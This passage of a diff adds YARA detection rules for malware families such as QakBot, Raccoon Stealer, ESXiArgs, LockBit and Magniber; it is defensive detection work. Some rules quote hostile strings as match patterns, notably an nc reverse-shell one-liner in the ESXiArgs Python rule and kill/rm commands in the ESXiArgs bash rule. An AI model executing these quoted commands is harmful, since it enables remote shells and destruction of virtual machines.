+        $x1 = { B8 ?? ?? ?? ?? 50 64 FF 35 00 00 00 00 64 89 25 00 00 00 00 33 C0 89 08 }
+        $s1 = "PECompact2"
+
+    condition:
+         uint16(0) == 0x5a4d and $x1 at pe.entry_point and $s1 in (1024..1056) 
+}rule Play_Ransomware
+{
+    meta:
+		description = "Detects Play Ransomware"
+		author = "Mickaël Walter (I-Tracing)"
+		date = "2022-07-04"
+        yarahub_reference_md5 = "0ba1d5a26f15f5f7942d0435fa63947e"
+        yarahub_uuid = "3dad72db-1b26-42e9-93aa-403b132d956b"
+        yarahub_license = "CC BY-SA 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+
+	strings:
+		$a1 = "OpaqueKeyBlob" wide
+		$b1 = { 83 c1 01 ba 01 00 00 00 d3 e2 f7 d2 8b 45 18 03 45 fc 0f be 08 23 ca 8b 55 18 03 55 fc 88 0a } // Extract of deobfuscation code
+		$b2 = { 8b 4d f4 83 c1 01 ba 01 00 00 00 d3 e2 f7 d2 8b 45 f8 03 45 fc 0f be 08 23 ca 8b 55 f8 03 55 fc 88 0a } // Another extract
+
+    condition:
+        uint16(0) == 0x5a4d and 2 of ($a1, $b1, $b2) and filesize < 200KB
+}rule Powerpoint_Code_Execution {
+
+	meta:
+
+		author = "Ahmet Payaslioglu"
+		yarahub_author_twitter = "@Computeus7"
+		date = "2022-09-15"
+		description ="New code execution technique using Powerpoint has been seen in the wild. The technique is triggered by using hyperlinks instead of Run Program/Macro. This new method has bypassed all the vendors for 220 days since 2022-02-02."
+		yarahub_reference_md5 = "c0060c0741833af67121390922c44f91"
+		yarahub_reference_link = "https://www.linkedin.com/feed/update/urn:li:activity:6976093476027314176/" 
+		yarahub_uuid = "9582d920-9bc4-4db3-9048-54ea56567dbd"
+		yarahub_license = "CC0 1.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+
+
+	strings:
+
+		$a1 = {D0 CF 11 E0 A1 B1 1A E1} //header
+
+		$b1 = {6C 00 6F 00 63 00 61 00 6C 00 2E 00 6C 00 6E 00 6B} //local.lnk
+
+		$b2 = {6C 00 6D 00 61 00 70 00 69 00 32 00 2E 00 64 00 6C 00 6C 00} //lmapi2.dll
+
+		$b3 = {72 00 75 00 6E 00 64 00 6C 00 6C 00 33 00 32} //rundll32.exe
+
+		$b4 = {4E 00 65 00 74 00 2E 00 57 00 65 00 62 00 43 00 6C 00 69 00 65 00 6E 00 74 00 29 00 2E 00 44 00 6F 00 77 00 6E 00 6C 00 6F 00 61 00 64 00 44 00 61 00 74 00 61} //Net Web Client) Download Data
+
+	condition:
+		($a1 at 0) and (4 of ($b*)) and filesize < 2MB
+}rule privateloader : loader 
+{
+  meta:
+    author =                    "andretavare5"
+    org =                       "BitSight"
+    date =                      "2022-06-06"
+    description =               "PrivateLoader pay-per-install malware"
+    yarahub_author_twitter =    "@andretavare5"
+    yarahub_reference_link =    "https://tavares.re/blog/2022/06/06/hunting-privateloader-pay-per-install-service"
+    yarahub_malpedia_family =   "win.privateloader"
+    yarahub_uuid =              "5916c441-16b1-42b7-acaa-114c06296f38"
+    yarahub_license =           "CC BY-NC-SA 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5 =     "8f70a0f45532261cb4df2800b141551d"
+    
+  strings:
+    $code = {66 0F EF (4?|8?)} // pxor xmm(1/0) - str chunk decryption
+    $str = "Content-Type: application/x-www-form-urlencoded\r\n" wide ascii
+   	$ua1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" wide ascii
+    $ua2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36" wide ascii
+                              
+  condition:
+    uint16(0) == 0x5A4D and // MZ
+    $str and
+    any of ($ua*) and
+    #code > 100
+}rule PseudoManuscriptLoader{
+  meta:
+    author="@luc4m"
+    date="2023-03-26"
+    hash="e299ac0fd27e67160225400bdd27366f"
+    tlp="CLEAR"
+    yarahub_uuid = "b5613b13-99a6-4aa7-95a2-44ca02429965"
+    yarahub_license =  "CC0 1.0"
+    yarahub_rule_matching_tlp =  "TLP:WHITE"
+    yarahub_rule_sharing_tlp =  "TLP:WHITE"
+    yarahub_reference_md5= "53f9c2f2f1a755fc04130fd5e9fcaff4" 
+
+  strings:
+          $trait_0 = {57 8b ce 8b d8 e8 7b ff ff ff 8b 0b 89 08 33 ed 45 8b c5 5d 5b 5f 5e c2 04 00}
+        $trait_1 = {57 8b ce 8b d8 e8 7b ff ff ff 8b 0b 89 08 33 ed 45 8b c5 5d 5b 5f 5e c2 04 00}
+        $trait_2 = {ff 15 ?? ?? ?? ?? 85 c0 75 05 e8 6c f1 ff ff c2 04 00}
+        $trait_3 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}
+        $trait_4 = {b7 c0 0b c3 50 ff d6 53 89 45 ?? ff d6 89 45 ?? c7 45 ?? ?? ?? ?? ?? e9 9b fe ff ff}
+        $trait_5 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}
+        $trait_6 = {45 fc 56 8b c1 be 04 01 00 00 56 8d 8d ?? ?? ?? ?? 51 ff 70 ?? ff 15 ?? ?? ?? ?? 85 c0 74 56}
+        $trait_7 = {8d 75 ?? 56 2b d1 52 50 e8 bd f9 ff ff 83 c4 0c 8d 85 ?? ?? ?? ?? 50 e8 97 fc ff ff eb 02}
+        $trait_8 = {8d 45 ?? 50 8d 4d ?? 89 7d ?? e8 51 f5 ff ff 84 c0 74 08}
+        $trait_9 = {ff 74 b5 ?? 8b 4d ?? e8 e7 fa ff ff 3b c7 59 75 07}
+
+
+     $u1 = "https://%s.com/%d.html"
+
+  condition:
+     (uint16(0) == 0x5A4D) and filesize < 5MB and (1 of ($u*) and 5 of ($trait_*))
+
+
+}
+rule PUPPETLOADER_loader {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "87d14a7a-047f-4db2-83a9-1b0bd5097e1e"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "7fdeb5fb041463416620cf9f446532e4"
+  strings:
+        $a1 = "PuppetLoader.Puppet.Core.x64.Release" ascii wide
+        $a2 = "PuppetLoader.Puppet.Core" ascii wide
+        $a3 = "HijacjBmpPath" ascii wide
+        $a4 = "dwOriginBmpFileSize" ascii wide
+        $a5 = "TsClientReceptor_Core" ascii wide
+        $a6 = "PuppetLoader_Puppet_Core" ascii wide
+        $a7 = "TsClientReceptor.Install" ascii wide
+        $a8 = "l UnExist [" ascii wide
+        $a9 = "] Faild! Error" ascii wide
+        $a10 = "GUID_Common_FileShareMemoryName" ascii wide
+        $a11 = "GUID_Common_ShareMemoryName" ascii wide
+        $a12 = "GUID_CrackWinPassword_x64_Release" ascii wide
+        $a13 = "GUID_KeepAuthority_Launcher_Core_x64_Release" ascii wide
+        $a14 = "GUID_KeepAuthority_MainConsole_x64_Release" ascii wide
+        $a15 = "GUID_KeepAuthority_Service_Hijacker" ascii wide
+        $a16 = "GUID_PuppetLoader_Puppet_Core_x64_Release" ascii wide
+        $a17 = "GUID_PuppetLoader_Puppet_Shell_x64_Release" ascii wide
+        $a18 = "GUID_TsClientReceptor_Core_PreventRepeatRunning_MutexName" ascii wide
+        $a19 = "GUID_TsClientReceptor_Core_x64_Release" ascii wide
+        $a20 = "Mutex_KeepAuthority_Launcher_Core_x64_Release" ascii wide
+        $a21 = "[+] SendParam to [Explorer.exe] for Load TsClientReceptor" ascii wide
+        $a22 = "[+] TsClientReceptor.Install.Injector [Explorer.exe]" ascii wide
+        $a23 = "[-] Injector to [Explorer.exe] Faild! Error" ascii wide
+        $a24 = "[-] Puppet.Shell UnExist [Puppet.Core.x64.Release]" ascii wide
+        $g1 = "{0137C4B3-9511-54A1-DAFA-EF5916E42AE7}" ascii wide
+        $g2 = "{07243368-21B1-22F0-9757-49A405B4DDF1}" ascii wide
+        $g3 = "{09884BAB-D4AD-1969-8807-A4AE797A8C31}" ascii wide
+        $g4 = "{0D287554-3E48-C081-1EEE-6E73FA4749E1}" ascii wide
+        $g5 = "{0DDC8939-E627-3895-4CDA-A703C54AF86F}" ascii wide
+        $g6 = "{0E0E5273-C9DC-03FB-7830-014DD7143F48}" ascii wide
+        $g7 = "{27737527-D71F-1A85-081D-080A2F6A10E1}" ascii wide
+        $g8 = "{2D606381-46DB-0AFC-325B-9687FB5E86CB}" ascii wide
+        $g9 = "{36BF388E-8509-E892-430C-D0ABC3038CE6}" ascii wide
+        $g10 = "{3A8163C4-1D40-DFD0-AB78-BEF1C8423439}" ascii wide
+        $g11 = "{409A21C9-45D9-A0C9-5564-E3647EC26CB0}" ascii wide
+        $g12 = "{46B0888B-0941-52E6-6FBA-80F04E425935}" ascii wide
+        $g13 = "{4AF0C1F6-714E-A36C-428D-851DC708EF2B}" ascii wide
+        $g14 = "{4F97AB75-B463-0399-D30E-FC22B4596D64}" ascii wide
+        $g15 = "{54A4A30A-C06A-3EE6-C36D-0F84820221CA}" ascii wide
+        $g16 = "{6ED6C950-9133-A1C5-A010-EC27B06C80B6}" ascii wide
+        $g17 = "{73303282-8959-6FA7-2DBE-E4126D8B6634}" ascii wide
+        $g18 = "{78106D5F-CD1A-A8C4-A625-6863092B4BBA}" ascii wide
+        $g19 = "{7D8DA9DC-1F3B-2E5C-AA59-9418E652E4AA}" ascii wide
+        $g20 = "{8341B127-B109-66A3-9F23-E9C52D6309BE}" ascii wide
+        $g21 = "{94262E6D-AC4C-89C5-C380-668F0CBA9F4C}" ascii wide
+        $g22 = "{A20827CB-C06C-967E-00AD-C6BDC9B3C8B8}" ascii wide
+        $g23 = "{A31EACD0-359E-2FDD-D0DF-C253F2BCE623}" ascii wide
+        $g24 = "{ADB3515D-426D-B1BB-6EA4-DCD760485C82}" ascii wide
+        $g25 = "{AFE10005-B7DF-352C-1F79-FAEE9EF6BB5C}" ascii wide
+        $g26 = "{B27FAFB3-62A8-DE16-360A-2F5FEE4F5B97}" ascii wide
+        $g27 = "{B573FEAA-9F11-9459-5A70-25687347EEF6}" ascii wide
+        $g28 = "{B5A7BDC2-0FAC-3EE8-B382-7A32599C3C0F}" ascii wide
+        $g29 = "{B97CBA44-A361-1602-2934-7D08A4E1F49F}" ascii wide
+        $g30 = "{CE2A883F-04FA-B568-6788-F3D29780989D}" ascii wide
+        $g31 = "{D11BE42E-763C-5134-93AA-1F618C8F3C56}" ascii wide
+        $g32 = "{D47CBD52-96C3-1B68-2C88-84D495F8C7A1}" ascii wide
+        $g33 = "{E9F0F295-7A48-C9ED-6696-3B4D2BBEC787}" ascii wide
+        $g34 = "{EA205CF8-4CC4-4FBB-E430-AF497368CF46}" ascii wide
+        $g35 = "{F032FD6E-C8EE-EDFC-0ECD-41C2BA46965B}" ascii wide
+        $g36 = "{F198C4FF-5133-EFEA-C6FC-330B9AF9E208}" ascii wide
+    condition:
+        any of ($a*) or 5 of ($g*)
+}rule QakBot_OneNote_Loader {
+
+  meta:
+      author = "Ankit Anubhav - ankitanubhav.info"
+      description = "Detects a OneNote malicious loader mostly used by QBot (TA570/TA577)"
+      date = "2023-02-04"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "b6c8d82a4ec67398c756fc1f36e32511"
+      yarahub_uuid = "cbbe7ec6-1658-4f4b-b229-8ade27bff9f4"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.qakbot"
+
+strings:
+
+  $x = { E4 52 5C 7B 8C D8 A7 4D AE B1 53 78 D0 29 96 D3 } // OneNote header
+
+// Variant 1
+// Looking for evidence of onenote containing vbs/js/ and code to write data in registry and execute it.
+// Some of these might be obfuscated so looking for a 3/5 match.
+  $a = "javascript" nocase
+  $b = "vbscript" nocase
+  $c = "regread" nocase
+  $d = "regwrite" nocase
+  $e = "RegDelete" nocase
+
+// Variant 2
+// Instead of hta abuses batch and powershell to download and run the DLL
+
+  $f = ".cmd&&start /min" nocase //edit 07.02.22 for batch file vector
+  $f2 = "&&cmd /c start /min" nocase // edit 14.02.22 run command and then exit
+  $g = "powershell" nocase
+
+// Variant 3
+// Involves powershell as well but obfuscation is different.
+// The string powershell can not be found because it is partially hidden by environment variables.
+
+  $tok1 = "rundll32 C:\\ProgramData\\" nocase // tok1 botnet ID
+
+// Some cases they are obfuscating a lot by breaking all in set
+
+$h = "set" // Look for several of these
+$i = "start /min"
+
+
+
+condition:
+	$x and ((3 of ($a,$b,$c,$d,$e)) or (($f or $f2) and $g) or $tok1 or (#h > 15 and $i))
+
+
+}
+rule Qakbot_WSF_loader {
+
+  meta:
+      author = "Ankit Anubhav -ankitanubhav.info"
+      description = "Detects a WSF loader used to deploy Qakbot DLL"
+      date = "2023-02-15"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "ff19670725eaf5df6f3d2ca656d3db27"
+      yarahub_uuid = "211e3eac-1acf-45af-bac9-e0a4c353560c"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.qakbot"
+
+   strings:
+
+    $y = "noitcnuf" nocase
+    $z = "BEGIN CERTIFICATE REQUEST" nocase
+
+    condition:
+    $y and $z and filesize < 20000
+
+}
+rule Qakbot_IsoCampaign{
+meta:
+author = "Malhuters"
+description = "Qakbot New Campaign ISO"
+date = "2022-10-06"
+yarahub_reference_md5 = "456373BC4955E0B6750E8791AB84F004"
+yarahub_uuid = "cef91a6a-f270-4c35-87a4-98b6f78096db"
+yarahub_license = "CC0 1.0"
+yarahub_rule_matching_tlp = "TLP:WHITE"
+yarahub_rule_sharing_tlp = "TLP:WHITE"
+malpedia_family = "win.qakbot"
+strings:
+$str1 = "CD001"
+$str2 = "This disc contains Unicode file names and requires an operating system"
+$str3 = "such as Microsoft Windows 95 or Microsoft Windows NT 4.0."
+$str4 = "README.TXT"
+$str5 = "Windows"
+$str6 = "C:\\Windows\\System32\\cmd.exe"
+$str7 = "%SystemRoot%\\System32\\shell32.dll"
+$str8 = "desktop-"
+$str9 = ">CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), default quality"
+condition:
+(5 of ($str*)) 
+}rule QBOT_HTMLSmuggling_a {
+
+  meta:
+      author = "Ankit Anubhav - ankitanubhav.info"
+      description = "Detects QBOT HTML smuggling variants"
+      date = "2022-06-26"
+      yarahub_author_twitter = "@ankit_anubhav"
+      yarahub_author_email = "ankit.yara@inbox.ru"
+      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
+      yarahub_reference_md5 = "1807f10ee386d0702bbfcd1a4da76fd1"
+      yarahub_uuid = "8db8aecd-53ae-4772-8d9c-38b121cfe0e0"
+      yarahub_license = "CC0 1.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      malpedia_family = "win.qakbot"
+
+   strings:
+       $x = "html"
+       $y = "UEsDB"
+       $z = "atob("
+       $c1 = "viewport"
+       $c2 = "initial-scale=1"
+       $escaped = { 5c 78 36 44 5c 78 37 33 5c 78 35 33 5c 78 36 31 5c 78 37 36 5c 78 36 35 5c 78 34 46 5c 78 37 32 5c 78 34 46 5c 78 37 30 5c 78 36 35 5c 78 36 45 5c 78 34 32 5c 78 36 43 5c 78 36 46 5c 78 36 32 }
+       $normal = "msSaveOrOpenBlob"
+       $qbot26092022 = { 2e 7a 69 70 3c 2f 62 3e }
+       $qbotmagic = "VUVzREJC"
+       $qbotmagic_reversed = "CJERzVUV"
+       $obama211 = "IHImERWP"
+    condition:
+       ($x and $y and $z and (($c1 and $c2) or $qbot26092022 ) and ($escaped or $normal)) or ($x and ($qbotmagic or $qbotmagic_reversed or $obama211))  and filesize > 500
+}
+rule RABBITHUNT_cls {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "d7c6a7d6-20d9-40d0-a63c-2c780bee821e"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "22a968beda8a033eb31ae175b7e0a937"
+  strings:
+    $a = "k_3872.cls"
+    $b = "c_2910.cls"
+    $c = "MataNet"
+    $d = { 76 55 82 F6 93 82 B2 C7 77 15 13 3E 72 80 D4 DD }
+    $e = { 72 82 EE F1 F2 8F C2 72 87 99 A8 2A AA C7 44 79 }
+  condition:
+    any of them
+}rule RABBITHUNT_loader {
+  meta:
+    date = "2022-06-13"
+    author = "Willi Ballenthin"
+    yarahub_author_email = "william.ballenthin@mandiant.com"
+    yarahub_author_twitter = "@williballenthin"
+    yarahub_uuid = "a0476975-9fb5-410e-90be-1a4acd6398e3"
+    yarahub_license = "CC BY 4.0"
+    yarahub_rule_matching_tlp = "TLP:WHITE"
+    yarahub_rule_sharing_tlp = "TLP:WHITE"
+    yarahub_reference_md5 = "22a968beda8a033eb31ae175b7e0a937"
+  strings:
+        $a = "kernel32.dll:LoadLibraryA"
+        $b = "kernel32.dll:VirtualFree"
+        $c = "kernel32.dll:VirtualAlloc"
+        $d = "kernel32.dll:UnmapViewOfFile"
+        $e = "kernel32.dll:GetFileAttributesW"
+        $f = "kernel32.dll:GetFileSize"
+        $g = "kernel32.dll:MapViewOfFile"
+        $h = "kernel32.dll:CloseHandle"
+        $i = "kernel32.dll:CreateFileW"
+        $j = "kernel32.dll:CreateFileMappingW"
+        
+  condition:
+    any of them
+}rule RaccoonV2 : loader stealer
+{
+    meta:
+        author                    = "@_FirehaK <yara@firehak.com>"
+        date                      = "2022-06-04"
+        description               = "Detects Raccoon Stealer version 2.0 (called Recordbreaker before attribution)."
+        malpedia_family           = "win.recordbreaker"
+        modified                  = "2022-10-23"
+        reference                 = "https://www.zerofox.com/blog/brief-raccoon-stealer-version-2-0/"
+        yarahub_author_twitter    = "@_FirehaK"
+        yarahub_author_email      = "yara@firehak.com"
+        yarahub_reference_link    = "https://www.zerofox.com/blog/brief-raccoon-stealer-version-2-0/"
+        yarahub_reference_md5     = "b35cde0ed02bf71f1a87721d09746f7b"
+        yarahub_uuid              = "817722f6-fe01-4772-b432-adb7b0c3a5ec"
+        yarahub_license           = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp  = "TLP:WHITE"
+
+    strings:
+        $get_username = { 6802020000 6a40 c745fc01010000 (ff15??????00|ffd0) 8bf0 8d45fc 50 56 ff15??????00 8bc6 5e c9 c3 }
+        $to_wide_char = { 8d145d10000000 52 6a40 (ff15??????00|ffd6) 53 8bf0 56 6aff 57 6a00 68e9fd0000 ff15 }
+        $x1 = { 6878ff0000 6a40 8bf1 (ff15??????00|ffd0) 8b16 8bc8 e8???????? ba???????? 8bc8 e8???????? ba???????? 8bc8 5e e9 }
+        $x2 = { ff15??????00 85ff 75?? 57 ff15??????00 8b45?? 40 8945?? 83f805 7c?? eb }
+        $x3 = { 6808020000 6a40 (ff15??????00|ffd0) 8b55e4 8bc8 e8???????? 8b15???????? 8bc8 e8???????? 8b7df4 8bc8 8bd7 e8???????? ba??????00 8bc8 e8???????? 8b0d???????? 8b }
+        $x4 = { 6808020000 6a40 (ff15??????00|ffd1) 6a00 6a1a 50 6a00 8945?? ff15??????00 8bce e8???????? 85c0 74 }
+        $x5 = { 85c9 74?? 0fb73c30 6685ff 74?? 66893e 83c602 49 83ea01 75?? 5f 33c9 b87a000780 }
+        $xor_c2 = { 8bc8 33d2 8b45fc f7f1 8a0e 8b45fc 328a???????? 40 880c33 46 8945fc 83f840 72 }
+        $xor_str = { 8bc8 33d2 8bc3 f7f1 8b45f8 8a0c02 8d1433 8b45fc 8a0410 32c1 43 8802 3bdf 72 }
+
+    condition:
+        uint16(0) == 0x5a4d
+        and 3 of them
+}rule RANSOM_ESXiArgs_Ransomware_Bash_Feb23
+{
+    meta:
+	author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+	description = "Detects the ESXiArgs Ransomware encryption bash script"
+	reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
+	date = "2023-02-07"
+	tlp = "CLEAR"
+	yarahub_reference_md5 = "d0d36f169f1458806053aae482af5010"
+	yarahub_uuid = "4498d57f-44ec-47f2-8455-ceeacd3dc07e"
+	yarahub_license = "CC BY 4.0"
+	yarahub_rule_matching_tlp = "TLP:WHITE"
+	yarahub_rule_sharing_tlp = "TLP:WHITE"
+	yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+	$bash = "#!/bin/sh"
+	
+	$wait = "Waiting for task' completion..."
+
+	$comment0 = "## SSH HI"
+	$comment1 = "## CHANGE CONFIG"
+	$comment2 = "## STOP VMX"
+	
+	$kill0 = "echo \"KILL VMX\""
+	$kill1 = "kill -9 $(ps | grep vmx | awk '{print $2}')"
+	
+	$index = "$path_to_ui/index1.html"
+
+	$ext0 = ".vmdk" 
+	$ext1 = ".vmx"
+	$ext2 = ".vmxf"
+	$ext3 = ".vmsd"
+	$ext4 = ".vmsn"
+	$ext5 = ".vswp"
+	$ext6 = ".vmss"
+	$ext7 = ".nvram"
+	$ext8 = ".vmem"
+
+	$clean0 ="/bin/rm -f $CLEAN_DIR\"encrypt\" $CLEAN_DIR\"nohup.out\" $CLEAN_DIR\"index.html\" $CLEAN_DIR\"motd\" $CLEAN_DIR\"public.pem\" $CLEAN_DIR\"archieve.zip\""
+	$clean1 = "/bin/echo '' > /etc/rc.local.d/local.sh"
+
+    condition:
+	$bash
+	and $wait
+	and any of ($comment*)
+	and 2 of ($kill*)
+	and $index
+	and 4 of ($ext*)
+	and 2 of ($clean*)
+}rule RANSOM_ESXiArgs_Ransomware_Encryptor_Feb23
+{
+    meta:
+		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+		description = "Detects the ESXiArgs Ransomware 'encrypt' binary"
+		reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
+		date = "2023-02-07"
+		tlp = "CLEAR"
+        yarahub_reference_md5 = "87b010bc90cd7dd776fb42ea5b3f85d3"
+		yarahub_uuid = "5eed9fd1-410e-4d38-a355-d89617398785"
+		yarahub_license = "CC BY 4.0"
+		yarahub_rule_matching_tlp = "TLP:WHITE"
+		yarahub_rule_sharing_tlp = "TLP:WHITE"
+		yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		// Sosemanuk Pseudo-Random Number Generator
+        $sosemanuk_prng = {48 8b 45 f8 48 01 45 e0 48 8b 45 f8 48 29 45 d8 48 8b 45 e8 8b 90 80 00 00 00 48 8b 45 f8 01 c2 48 8b 45 e8 89 90 80 00 00 00}
+        
+        // Sosemanuk Multiplication Tables
+        // based on Findcrypt3 rule https://github.com/polymorf/findcrypt-yara/blob/ad165a6b2bd5b56932657b96edffa851b5b00b15/findcrypt3.rules#L1522
+        $sosemanuk_mul_a = {00 00 00 00 13 CF 9F E1 26 37 97 6B 35 F8 08 8A [992] DE 4D 5B B5 CD 82 C4 54 F8 7A CC DE EB B5 53 3F}
+        $sosemanuk_mul_ia = {00 00 00 00 CD 40 0F 18 33 80 1E 30 FE C0 11 28 [992] 1C 65 E2 9E D1 25 ED 86 2F E5 FC AE E2 A5 F3 B6}
+
+        $interpreter = "/lib64/ld-linux-x86-64.so.2"
+
+        $debug0 = "encrypt_bytes: too big data"
+        $debug1 = "Progress: %f"
+
+        $help = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]"
+
+    condition:
+        uint32be(0x0) == 0x7F454C46
+        and all of ($sosemanuk_*)
+        and $interpreter
+        and 2 of ($debug*)
+        and $help
+}
+
+
+
+
+
+
+rule RANSOM_ESXiArgs_Ransomware_Python_Feb23
+{
+    meta:
+	author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
+	description = "Detects the ESXiArgs Ransomware encryption python script"
+	reference = "https://www.secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware/"
+	date = "2023-02-07"
+	tlp = "CLEAR"
+	yarahub_reference_md5 = "c358fe0e8837cc577315fc38892b937d"
+	yarahub_uuid = "e79d0764-bf61-4e71-b181-8ed13edfcb98"
+	yarahub_license = "CC BY 4.0"
+	yarahub_rule_matching_tlp = "TLP:WHITE"
+	yarahub_rule_sharing_tlp = "TLP:WHITE"
+	yarahub_author_twitter = "@SI_FalconTeam"
+
+    strings:
+	$python = "#!/bin/python"
+	$desc = "This module starts debug tools"
+
+	$command0 = "server_namespace"
+	$command1 = "service_instance"
+	$command2 = "local"
+	$command3 = "operation_id"
+	$command4 = "envelope"
+
+	$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
+	$OpenSLPPort = "port = '427'"
+	$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"
+
+    condition:
+	$python
+	and $desc
+	and 4 of ($command*)
+	and $cmd
+	and $OpenSLPPort
+	and $listener
+}import "pe"
+import "math"
+import "console"
+
+rule RANSOM_Lockbit_Black_Packer : Ransomware {
+
+   meta:
+      author = "SECUINFRA Falcon Team"
+      description = "Detects the packer used by Lockbit Black (Version 3)"
+      reference = "https://twitter.com/vxunderground/status/1543661557883740161"
+      date = "2022-07-04"
+      tlp = "WHITE"
+      yarahub_uuid = "de99eca0-9502-4942-a30a-b3f9303953e3"
+      yarahub_reference_md5 = "38745539b71cf201bb502437f891d799"
+      yarahub_license = "CC BY 4.0"
+      yarahub_rule_matching_tlp = "TLP:WHITE"
+      yarahub_rule_sharing_tlp = "TLP:WHITE"
+      yarahub_author_twitter = "@SI_FalconTeam"
+      hash0 = "80e8defa5377018b093b5b90de0f2957f7062144c83a09a56bba1fe4eda932ce"
+      hash1 = "506f3b12853375a1fbbf85c82ddf13341cf941c5acd4a39a51d6addf145a7a51"
+      hash2 = "d61af007f6c792b8fb6c677143b7d0e2533394e28c50737588e40da475c040ee"
+
+   strings:
+      $sectionname0 = ".rdata$zzzdbg" ascii
+      $sectionname1 = ".xyz" ascii fullword
+      
+      // hash checks
+      $check0 = {3d 75 80 91 76 ?? ?? 3d 1b a4 04 00 ?? ?? 3d 9b b4 84 0b}
+      $check1 = {3d 75 ba 0e 64}
+      
+      // hex/ascii calculations
+      $asciiCalc = {66 83 f8 41 ?? ?? 66 83 f8 46 ?? ?? 66 83 e8 37}
+      
+   condition:
+      uint16(0) == 0x5a4d
+      and filesize > 111KB // Size on Disk/1.5
+      and filesize < 270KB // Size of Image*1.5
+      and all of ($sectionname*)
+      and any of ($check*)
+      and $asciiCalc
+      and for any i in (0..pe.number_of_sections - 1): 
+      (math.entropy(pe.sections[i].raw_data_offset, pe.sections[i].raw_data_size) > 7.9
+      and (pe.sections[i].name == ".text" or pe.sections[i].name == ".data" or pe.sections[i].name == ".pdata")//)
+      // console requires Yara 4.2.0. For older versions uncomment closing bracket above und comment out the line below
+      and console.log("High Entropy section found:", pe.sections[i].name))
+}
+rule RANSOM_Magniber_LNK_Jan23
+{
+	meta:
+		author = "SECUINFRA Falcon Team"
+		description = "Detects Magniber Ransomware LNK files from fake Windows Update delivery method"
+		reference = "https://twitter.com/SI_FalconTeam/status/1613540054382559234"
+		date = "2023-01-13"
+		tlp = "CLEAR"
+		hash = "16ecec4efa2174dec11f6a295779f905c8f593ab5cc96ae0f5249dc50469841c"
+		yarahub_uuid = "ceee9545-c008-41d8-bc2f-513e78209d21"
+        yarahub_reference_md5 = "fedb6673626b89a9ee414a5eb642a9d9"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
+        yarahub_author_twitter = "@SI_FalconTeam"
+
+	strings:
+		$netbiosName = "victim1" ascii fullword
+		$macAddress = {00 0C 29 07 E1 6D}
+	
+	condition:
+		uint32be(0x0) == 0x4C000000 
+		and all of them
+}rule RANSOM_Magniber_ISO_Jan23
+{
+	meta:
+		author = "SECUINFRA Falcon Team"
+		description = "Detects Magniber Ransomware ISO files from fake Windows Update delivery method"
+		reference = "https://twitter.com/SI_FalconTeam/status/1613540054382559234"
+		date = "2023-01-13"
+		tlp = "CLEAR"
+		hash = "4dcbcc070e7e3d0696c777b63e185406e3042de835b734fe7bb33cc12e539bf6"
+		yarahub_uuid = "19686301-e651-4bfe-b295-712a90f3156c"
+        yarahub_reference_md5 = "fedb6673626b89a9ee414a5eb642a9d9"
+        yarahub_license = "CC BY 4.0"
+        yarahub_rule_matching_tlp = "TLP:WHITE"
+        yarahub_rule_sharing_tlp = "TLP:WHITE"
